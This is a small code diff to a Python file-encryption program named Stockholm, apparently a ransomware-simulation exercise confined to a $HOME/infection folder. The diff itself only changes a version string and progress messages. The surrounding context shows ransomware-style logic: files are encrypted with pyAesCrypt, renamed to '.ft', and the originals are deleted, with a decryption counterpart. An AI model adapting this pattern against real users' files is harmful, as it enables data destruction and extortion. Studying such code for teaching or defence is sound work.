@@ -3,7 +3,7 @@ import os
 import pyAesCrypt
 import secrets
 
-program_version = 'Version 1.0'
+program_version = '1.0.0'
 supported_extensions_path = "./supported_extensions"
 infection_path = f"{os.getenv('HOME')}/infection/"
 extensions = ".ft"
@@ -35,7 +35,7 @@ class Stockholm:
                     if (not file_path.endswith(tuple(".ft"))):
                         continue ;
                     if (not self.isSilent):
-                        print("Decrypting,", file_path)
+                        print("Decrypting...", file_path)
                     pyAesCrypt.decryptFile(file_path, file_path[:-3], self.key, buffer_size)
                     os.remove(file_path)
         except:
@@ -71,7 +71,7 @@ class Stockholm:
                 if (not file_path.endswith(tuple(self.supported_extensions))):
                     continue ;
                 if (not self.isSilent):
-                    print("Encrypting,", file_path)
+                    print("Encrypting...", file_path)
                 pyAesCrypt.encryptFile(file_path, file_path + ".ft", self.key, buffer_size)
                 os.remove(file_path)
 
